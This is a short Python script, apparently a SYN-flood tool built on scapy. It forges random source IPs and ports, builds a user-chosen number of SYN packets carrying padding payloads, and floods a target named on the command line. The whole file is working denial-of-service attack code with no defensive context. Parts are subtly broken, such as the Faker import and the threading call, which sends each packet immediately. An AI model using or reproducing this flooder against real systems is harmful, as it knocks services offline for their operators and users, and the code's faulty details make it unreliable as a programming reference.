from scapy.all import *
import sys
import time
import Faker

fake = Faker()

def atk(target, seq):

    ip = IP()
    tcp = TCP()
    
    spoof = fake.ipv4()
    spoofport = RandShort()

    size = 1024
    payload = raw(b'X'*size)

    ip.dst = target
    ip.src = spoof
    tcp.sport = spoofport
    tcp.flags = 'S'
    tcp.window = 8
    tcp.seq = seq
    packet = ip / tcp / payload
    return packet

if len(sys.argv) != 3:
    print('USAGE: synatk.py <FQDN or ip> <number of packets>')
    sys.exit(1)
dest = sys.argv[1]
num_packets = sys.argv[2]
try:
        num_packets = int(num_packets)
except:
        sys.exit('Invalid number of packets')
counter = random.randint(0,91)
ceiling = random.randint(100, 1001)
pkts = []

proctime = time.process_time()

print(f'making {num_packets} packets...')
for i in range(0, num_packets+1):
    pkt = atk(dest, counter)
    counter += 1
    pkts.append(pkt)
    if counter == ceiling:
         counter = random.randint(0,91)

proctime = time.process_time()-proctime
print(f'Done in {proctime} sec')

print(f'flooding {dest}...')
for pkt in pkts:
    thread = threading.Thread(target=send(pkt, verbose = 0))
    thread.start()

proctime = time.process_time()-proctime
print(f'Done in {proctime} sec')
    

